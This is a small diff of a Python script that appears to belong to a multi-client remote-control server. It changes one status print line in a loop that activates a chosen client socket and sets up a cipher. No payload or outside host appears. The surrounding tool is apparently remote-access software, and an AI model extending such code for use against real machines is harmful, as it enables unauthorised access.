@@ -53,7 +53,7 @@ while True:
     activate = input('Enter option: ')
     
     Send(socks[activate], 'activate')
-    pr('Activating client %d: %s' % (activate, clients[activate]))
+    pr('Activating client ' + activate)
 
     cipher = get_cipher()
     active = True
